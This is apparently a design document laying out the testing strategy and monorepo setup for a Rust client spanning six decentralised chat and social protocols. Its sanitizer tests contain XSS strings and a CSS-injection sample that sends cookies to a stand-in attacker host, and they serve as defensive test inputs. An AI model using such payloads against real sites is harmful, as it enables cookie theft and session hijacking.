# Liberation Client — Testing Strategy & Project Infrastructure

> Preparando o terreno para implementação: como testar 6 protocolos e como estruturar o monorepo.
> **Iteração 8** — 2026-07-01

---

## Part 1: Testing Strategy

### 1.1 Testing Pyramid

```
         ╱  E2E  ╲         Manual + automated: full app flows
        ╱──────────╲
       ╱ Integration ╲       Protocol adapters + real servers
      ╱────────────────╲
     ╱   Unit Tests      ╲    Pure functions, mappers, dedup, crypto
    ╱──────────────────────╲
   ╱   Static Analysis       ╲  clippy, cargo-audit, cargo-deny
  ╱────────────────────────────╲
```

### 1.2 Unit Tests

**Coverage target**: 85%+ on core crates (`event-bus`, `canonical`, `identity`, `sync`). 70%+ on protocol adapters.

```rust
// libs/canonical/src/post.rs

#[cfg(test)]
mod tests {
    use super::*;

    /// Test that Mastodon status → UnifiedPost mapping is correct.
    #[test]
    fn test_map_mastodon_status_to_post() {
        let status = mock_mastodon_status();
        let post = map_status_to_post(&status).unwrap();
        assert_eq!(post.protocol, Protocol::ActivityPub);
        assert_eq!(post.content, "Hello world");
        assert!(!post.content.contains("<script>")); // Sanitized!
    }

    /// Test that HTML sanitization strips XSS vectors.
    #[test]
    fn test_sanitize_strips_xss() {
        let html = "<p>Hello</p><script>alert('xss')</script><img onerror='alert(1)'>";
        let clean = sanitize_html_to_plain_text(html);
        assert!(!clean.contains("script"));
        assert!(!clean.contains("onerror"));
        assert!(clean.contains("Hello"));
    }

    /// Test Nostr kind:1 → UnifiedPost mapping with NIP-10 threading.
    #[test]
    fn test_map_nostr_text_note_with_thread() {
        let event = mock_nostr_event_with_e_tags();
        let post = map_text_note_to_post(&event).unwrap();
        assert_eq!(post.reply_to, Some("parent_event_id".into()));
        assert_eq!(post.root_post, Some("root_event_id".into()));
    }

    /// Test EventDeduplicator correctly identifies duplicates.
    #[tokio::test]
    async fn test_deduplicator_duplicates() {
        let dedup = EventDeduplicator::new();
        assert!(dedup.is_new("event_1").await);
        assert!(!dedup.is_new("event_1").await); // Duplicate!
        assert!(dedup.is_new("event_2").await);
    }

    /// Test BIP-39 derivation produces correct Nostr nsec.
    #[test]
    fn test_derive_nostr_key_from_seed() {
        let seed = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
        let nsec = derive_nostr_nsec(seed).unwrap();
        assert!(nsec.starts_with("nsec1"));
    }

    /// Test identity linking by domain match.
    #[test]
    fn test_link_identities_by_domain() {
        let mastodon = create_profile(Protocol::ActivityPub, "@alice@example.com");
        let bluesky = create_profile(Protocol::ATProtocol, "alice.bsky.social");
        // NIP-05 on Nostr points to example.com, Bluesky handle is alice.bsky.social with domain TXT record.
        let confidence = compute_linking_confidence(&mastodon, &bluesky);
        assert!(confidence > 0.5);
    }
}

// Mock helpers for tests.
fn mock_mastodon_status() -> megalodon::entities::Status { /* ... */ }
fn mock_nostr_event_with_e_tags() -> nostr_sdk::Event { /* ... */ }
fn create_profile(protocol: Protocol, handle: &str) -> UnifiedProfile { /* ... */ }
```

### 1.3 Integration Tests

**Per-protocol integration test suites** running against real or containerized servers:

```rust
// tests/integration/nostr_adapter.rs

/// Integration test: connect to a local Nostr relay, publish, read back.
#[tokio::test]
#[ignore = "Requires local Nostr relay running on ws://localhost:8080"]
async fn test_nostr_publish_and_read() {
    // Use `nostr-rs-relay` as a local test relay.
    let adapter = NostrAdapter::connect(
        "nsec1...".parse().unwrap(),
        vec!["ws://localhost:8080".to_string()],
    ).await.unwrap();

    // Publish.
    let post = adapter.publish_post("Test from integration test", vec![]).await.unwrap();
    assert_eq!(post.content, "Test from integration test");

    // Read back.
    tokio::time::sleep(Duration::from_secs(1)).await;
    let posts = adapter.get_home_feed(None, 10).await.unwrap();
    assert!(posts.iter().any(|p| p.id == post.id));
}

/// Integration test: Nostr relay reconnection with backoff.
#[tokio::test]
async fn test_nostr_reconnection_backoff() {
    // Connect to a relay, kill it, verify reconnection.
}

/// Integration test: NIP-44 encrypted DM roundtrip.
#[tokio::test]
async fn test_nostr_nip44_dm_roundtrip() {
    let alice = NostrAdapter::connect_with_keys(alice_keys()).await.unwrap();
    let bob = NostrAdapter::connect_with_keys(bob_keys()).await.unwrap();

    alice.publish_dm(&bob.pubkey(), "Secret message").await.unwrap();
    tokio::time::sleep(Duration::from_secs(2)).await;

    let messages = bob.get_dms().await.unwrap();
    let dm = messages.iter().find(|m| m.body == "Secret message");
    assert!(dm.is_some());
}
```

**Containerized test infrastructure**:

```yaml
# docker-compose.test.yml
services:
  # Nostr relay for integration tests.
  nostr-relay:
    image: nostr-rs-relay:latest
    ports: ["8080:8080"]

  # Mastodon instance for integration tests.
  mastodon:
    image: tootsuite/mastodon:latest
    environment:
      LOCAL_DOMAIN: test.local
      # ... test config ...

  # Matrix homeserver for integration tests.
  synapse:
    image: matrixdotorg/synapse:latest
    ports: ["8008:8008"]

  # IRC server for integration tests.
  ircd:
    image: inspircd/inspircd-docker:latest
    ports: ["6667:6667"]

  # XMPP server for integration tests.
  prosody:
    image: prosody/prosody:latest
    ports: ["5222:5222"]
```

### 1.4 Security Tests

**Critical: verify fixes for Black Hat 2025 Nostr vulnerabilities**:

```rust
/// Test: Our client verifies ALL signatures. Black Hat 2025 finding #2.
#[test]
fn test_reject_unsigned_nostr_event() {
    let mut event = nostr_sdk::Event::new(
        nostr_sdk::Kind::TextNote,
        "Fake post",
        &[],
    );
    event.sig = nostr_sdk::Signature::from_hex("deadbeef").unwrap(); // Invalid sig.
    let result = verify_event_signature(&event);
    assert!(result.is_err()); // MUST reject.
}

/// Test: Our client uses NIP-44, NOT NIP-04. Black Hat 2025 finding #4 (CBC malleability).
#[test]
fn test_nip04_dm_decryption_is_disabled() {
    let nip04_event = mock_nip04_encrypted_dm();
    let result = decrypt_dm(&nip04_event);
    assert!(result.is_err()); // NIP-04 is explicitly unsupported.
}

/// Test: HTML sanitization prevents XSS. Misskey CVE-2025-46340 style.
#[test]
fn test_xss_via_css_injection() {
    let html = "<div style=\"background-image: url('https://evil.com/steal?cookie=')\">Post</div>";
    let clean = sanitize_html_keep_formatting(html);
    assert!(!clean.contains("url("));
    assert!(!clean.contains("background-image"));
}

/// Test: Token rotation invalidates old tokens. Mastodon CVE-2025-62176 style.
#[tokio::test]
async fn test_token_rotation_invalidates_old() {
    // ...
}

/// Test: Matrix protocol confusion — only accept Olm for to-device. CVE-2022-39248.
#[test]
fn test_reject_megolm_encrypted_to_device() {
    // Matrix SDK handles this. Verify it's configured correctly.
}
```

**Fuzzing targets**:

```rust
// fuzz/fuzz_targets/nostr_event_parser.rs
#![no_main]
use libfuzzer_sys::fuzz_target;

fuzz_target!(|data: &[u8]| {
    // Attempt to parse any byte sequence as a Nostr event.
    // Must never panic. Must never cause OOM.
    if let Ok(event) = nostr_sdk::Event::from_json(data) {
        // Even valid events: verify doesn't panic.
        let _ = verify_event_signature(&event);
        let _ = map_event_to_canonical(&event);
    }
});

// fuzz/fuzz_targets/html_sanitizer.rs
fuzz_target!(|data: &[u8]| {
    if let Ok(html) = std::str::from_utf8(data) {
        // Sanitize must never panic, no matter how malformed the HTML.
        let _ = sanitize_html_keep_formatting(html);
    }
});
```

### 1.5 Protocol-Specific Test Matrices

| Protocol | Test Server | Key Tests |
|----------|------------|-----------|
| **Nostr** | `nostr-rs-relay` (local) | Sign/verify, NIP-44 encrypt/decrypt, dedup, reconnection, NIP-65 routing |
| **AT Protocol** | Local PDS + Jetstream mock | DID resolve, createRecord, facet parsing, Jetstream reconnect, blob upload |
| **ActivityPub** | `mastodon:latest` (Docker) | OAuth flow, timeline fetch, streaming WS, HTML sanitize, media upload |
| **Matrix** | `synapse:latest` (Docker) | Login, sync loop, E2EE bootstrap, SAS verify, room classify, SSSS backup |
| **IRC** | `inspircd:latest` (Docker) | Connect, JOIN, PRIVMSG, PING/PONG, reconnection, TLS verify |
| **XMPP** | `prosody:latest` (Docker) | WebSocket connect, MAM fetch, MUC join, OMEMO encrypt, carbons |

### 1.6 Performance Tests

```rust
/// Timeline rendering: 500 posts must render in < 16ms (60fps).
#[test]
fn test_timeline_render_performance() {
    let posts = generate_mock_posts(500);
    let start = std::time::Instant::now();
    render_timeline(&posts);
    let elapsed = start.elapsed();
    assert!(elapsed < Duration::from_millis(16));
}

/// SQLite FTS5: text search across 10,000 posts in < 100ms.
#[tokio::test]
async fn test_fts5_search_performance() {
    let db = setup_test_db_with_posts(10_000).await;
    let start = std::time::Instant::now();
    let results = db.search_posts("decentralized protocol").await.unwrap();
    let elapsed = start.elapsed();
    assert!(elapsed < Duration::from_millis(100));
    assert!(!results.is_empty());
}
```

### 1.7 Test CI Pipeline

```yaml
# .github/workflows/test.yml
name: Test Suite
on: [push, pull_request]

jobs:
  static-analysis:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cargo clippy --all-targets -- -D warnings
      - run: cargo fmt --check
      - run: cargo audit
      - run: cargo deny check

  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cargo test --lib --all

  integration-tests:
    runs-on: ubuntu-latest
    services:
      nostr-relay:
        image: nostr-rs-relay
        ports: ["8080:8080"]
    steps:
      - uses: actions/checkout@v4
      - run: cargo test --test '*' -- --include-ignored

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cargo test --lib security::

  fuzzing:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cargo fuzz run nostr_event_parser -- -max_total_time=300
      - run: cargo fuzz run html_sanitizer -- -max_total_time=300

  mobile-build-test:
    strategy:
      matrix:
        target: [aarch64-linux-android, x86_64-apple-ios]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cargo build --target ${{ matrix.target }}
```

---

## Part 2: Project Infrastructure

### 2.1 Monorepo Layout

```
liberation-client/
├── Cargo.toml              # Workspace root
├── Cargo.lock
├── .github/
│   └── workflows/
│       ├── test.yml
│       ├── security-audit.yml
│       └── release.yml
├── docker-compose.test.yml
├── rust-toolchain.toml     # Pinned Rust version
├── deny.toml               # cargo-deny config
├── audit.toml              # cargo-audit config
├── cliff.toml              # git-cliff changelog config
├── Makefile                # Common tasks
├── docs/                   # Generated docs (mdBook)
│   └── SUMMARY.md
│
├── libs/
│   ├── canonical/          # UnifiedPost, UnifiedProfile, Protocol enum
│   ├── event-bus/          # EventBus, event types, subscribers
│   ├── storage/            # SQLite, FTS5, queries, migrations
│   ├── sync/               # SyncEngine, OfflineQueue, ConnectivityMonitor
│   ├── identity/           # Key derivation, keychain, backup, linking
│   │
│   └── protocols/
│       ├── nostr/           # NostrAdapter, RelayManager, dedup, mapper
│       ├── atproto/         # ATProtocolAdapter, Jetstream, DID resolver
│       ├── activitypub/     # ActivityPubAdapter, HTML sanitizer, mapper
│       ├── matrix/          # MatrixChatModule, room classifier, E2EE
│       ├── irc/             # IRCAdapter, connection manager
│       └── xmpp/            # XMPPAdapter, stanza parser, OMEMO
│
├── bindings/               # UniFFI for Swift/Kotlin
│   └── uniffi/
│       ├── Cargo.toml
│       └── src/lib.rs
│
├── apps/
│   ├── ios/                # SwiftUI app
│   ├── android/            # Kotlin/Compose app
│   └── desktop/            # Tauri app (future)
│
├── fuzz/                   # cargo-fuzz targets
│   └── fuzz_targets/
│
└── tests/                  # Integration tests
    ├── integration/
    │   ├── nostr_tests.rs
    │   ├── atproto_tests.rs
    │   ├── activitypub_tests.rs
    │   └── ...
    └── fixtures/
        ├── mock_events/
        └── test_keys/
```

### 2.2 Workspace Cargo.toml

```toml
[workspace]
resolver = "2"
members = [
    "libs/canonical",
    "libs/event-bus",
    "libs/storage",
    "libs/sync",
    "libs/identity",
    "libs/protocols/nostr",
    "libs/protocols/atproto",
    "libs/protocols/activitypub",
    "libs/protocols/matrix",
    "libs/protocols/irc",
    "libs/protocols/xmpp",
    "bindings/uniffi",
]

[workspace.package]
version = "0.1.0"
edition = "2024"
rust-version = "1.85"
license = "AGPL-3.0-or-later"
repository = "https://github.com/liberation-client/liberation-client"

[workspace.dependencies]
tokio = { version = "1", features = ["full"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
chrono = { version = "0.4", features = ["serde"] }
anyhow = "1"
thiserror = "2"
tracing = "0.1"
tracing-subscriber = "0.3"
sqlx = { version = "0.8", features = ["runtime-tokio", "sqlite", "chrono"] }
uuid = { version = "1", features = ["v4"] }
lru = "0.12"
futures = "0.3"

# Protocol-specific
nostr-sdk = "0.39"
bitcoin = { version = "0.32", features = ["secp256k1"] }
shrike = "0.1"
megalodon = "1.0"
matrix-sdk = { version = "0.9", features = ["e2e-encryption", "sqlite"] }
tokio-xmpp = "4"
xmpp-parsers = "0.21"

# Testing
proptest = "1"
tokio-test = "0.4"
```

### 2.3 rust-toolchain.toml

```toml
[toolchain]
channel = "stable"
profile = "default"
components = ["rustfmt", "clippy", "rust-analyzer"]
targets = [
    "x86_64-unknown-linux-gnu",
    "x86_64-apple-darwin",
    "aarch64-apple-darwin",
    "aarch64-linux-android",
    "x86_64-apple-ios",
]
```

### 2.4 CI/CD Pipeline

```
┌─────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│  PR      │───→│ Lint +   │───→│ Unit +   │───→│ Security │───→│ Mobile   │
│  Opened  │    │ Format   │    │ Integ.   │    │ Audit    │    │ Build    │
└─────────┘    └──────────┘    └──────────┘    └──────────┘    └──────────┘
                                                      │              │
                                                      ▼              ▼
                                               ┌──────────┐   ┌──────────┐
                                               │ Changelog│   │ App Store│
                                               │ (git-cliff)│  │ Build    │
                                               └──────────┘   └──────────┘
```

### 2.5 Makefile

```makefile
# Quick-start targets for developers.
.PHONY: test lint audit fuzz docs build clean

test:
	cargo test --lib --all
	cargo test --test '*' -- --include-ignored

lint:
	cargo clippy --all-targets -- -D warnings
	cargo fmt --check

audit:
	cargo audit
	cargo deny check licenses
	cargo deny check bans

fuzz:
	cargo fuzz run nostr_event_parser -- -max_total_time=600
	cargo fuzz run html_sanitizer -- -max_total_time=600

docs:
	cargo doc --no-deps --document-private-items --open

build-mobile:
	cargo build --target aarch64-linux-android --release
	cargo build --target x86_64-apple-ios --release

clean:
	cargo clean
	find . -name "*.db" -delete
```

### 2.6 Commit Convention & Changelog

```
<type>(<scope>): <description>

Types:
  feat     - New feature
  fix      - Bug fix
  security - Security fix
  docs     - Documentation
  test     - Tests
  refactor - Code refactor
  perf     - Performance
  chore    - Maintenance

Scopes:
  nostr, atproto, activitypub, matrix, irc, xmpp
  event-bus, storage, sync, identity, canonical
  ios, android, desktop, ci

Examples:
  feat(nostr): implement NIP-44 encrypted DMs
  security(activitypub): fix XSS in HTML sanitizer
  test(storage): add FTS5 search performance benchmarks
  fix(sync): prevent duplicate events on reconnection
```

### 2.7 Dependency Audit Policy

```toml
# deny.toml
[licenses]
allow = ["MIT", "Apache-2.0", "AGPL-3.0", "BSL-1.0", "Unicode-DFS-2016", "CC0-1.0", "ISC"]
deny = ["GPL-2.0-only"] # Copyleft incompatibility with AGPL-3.0.

[bans]
deny = [
    # Ban outdated/unsafe crates.
    { name = "rust-crypto" },      # Unmaintained.
    { name = "native-tls" },       # Prefer rustls.
]

[sources]
unknown-registry = "deny"
unknown-git = "deny"
```

---

## Part 3: Development Onboarding

### One-command setup

```bash
git clone https://github.com/liberation-client/liberation-client
cd liberation-client
make setup   # Installs Rust toolchain, Docker, pre-commit hooks.
make test    # Verifies everything works.
make docs    # Opens full API documentation.
```

### Recommended dev environment

| Tool | Purpose |
|------|---------|
| `rust-analyzer` | IDE support (VS Code, Zed, Helix) |
| `cargo-watch` | Auto-run tests on save |
| `cargo-fuzz` | Fuzzing harness |
| `docker-compose` | Local test servers |
| `cargo-deny` | License/security audit |
| `git-cliff` | Changelog generation |

---

*Documento gerado na Iteração 8 do /loop.*
